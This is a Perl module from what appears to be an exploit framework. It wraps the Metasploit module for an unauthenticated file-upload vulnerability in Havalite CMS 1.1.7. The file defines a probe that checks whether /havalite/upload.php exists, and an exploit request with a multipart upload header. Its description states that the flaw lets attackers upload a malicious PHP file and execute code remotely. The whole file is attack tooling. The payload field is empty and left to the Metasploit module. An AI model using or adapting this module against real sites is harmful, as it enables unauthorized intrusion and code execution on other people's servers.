package HAVALITE::MSF::HavaliteUploadExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "HavaliteUploadExec";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/havalite/upload.php',
  PAYLOAD => '',
  TEXT => 'Checking If : /havalite/upload.php Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a file upload vulnerability found in Havalite CMS 1.1.7, and

        possibly prior.  Attackers can abuse the upload feature in order to upload a

        malicious PHP file without authentication, which results in arbitrary remote code

        execution.

      ",
  HAVALITE    => "tmp",
  METHOD      => "POST",
  MSF_MODULE  => "havalite_upload_exec",
  OSVDB       => 94405,
  PATH        => "havalite/upload.php?",
  PATHS       => ["havalite/upload.php", ""],
  PAYLOAD     => "",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The base path to havalite", VALUE => "/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'havalite/upload.php',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [POST] /havalite/upload.php',
      HEADERS      => {
        'Content-Type' => 'multipart/form-data; boundary=_Part_778_3888301408_2018565233',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
